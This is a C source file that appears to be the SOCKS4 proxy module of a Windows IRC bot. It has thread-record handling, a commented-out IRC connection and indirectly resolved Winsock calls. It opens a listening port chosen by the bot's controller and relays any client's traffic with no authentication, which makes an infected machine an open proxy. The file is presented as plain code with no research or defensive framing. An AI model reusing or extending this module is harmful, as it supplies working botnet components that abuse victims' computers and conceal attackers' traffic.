#include "includes.h"
#include "functions.h"

#ifndef NO_SOCK4SERV
#define SOCKS4_CONNECT 1
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91

typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
} SOCKS4HEADER;

void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		ZeroMemory(buf,sizeof(buf));
		fselect(0, &fd, NULL, NULL, NULL);

		if(fFD_ISSET(client, &fd))
		{
			if((len = frecv(client,buf,sizeof(buf),0))== -1) break;
			if(fsend(target,buf,len,0)== -1) break;
		}
	    if (fFD_ISSET(target,&fd))
		{
			if((len = frecv(target,buf,sizeof(buf),0))== -1) break;
			if(fsend(client,buf,len,0)== -1) break;
		}
	}
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	TIMEVAL timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (fselect(0, &fd, NULL, NULL, &timeout) == 0)
	{
		fclosesocket(client);
		return 0;
	}
	if (frecv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		fclosesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		fclosesocket(client);
		return 0;
	}
	ZeroMemory(&target_in,sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fconnect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		ZeroMemory(&hdr.userid,1024);
		fsend(client, (char *)&hdr, 8, 0);
		fclosesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	ZeroMemory(&hdr.userid,1024);
	fsend(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}

DWORD WINAPI SocksDaemon(LPVOID param)
{
	NTHREAD socks4 = *((NTHREAD*)param);
	NTHREAD *socks4s = (NTHREAD *)param;
	socks4s->gotinfo = TRUE;
	//IRC* irc=(IRC*)socks4.conn;

	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = fhtons(socks4.idata1);
	info.sin_addr.s_addr = INADDR_ANY;
	server = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fbind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		clearthread(socks4.threadnum);
		ExitThread(0);
	}
	if (flisten(server, 10) != 0)
	{
		clearthread(socks4.threadnum);
		ExitThread(0);
	}
	while (TRUE)
	{
		client = faccept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	clearthread(socks4.threadnum);
	ExitThread(0);
}
#endif
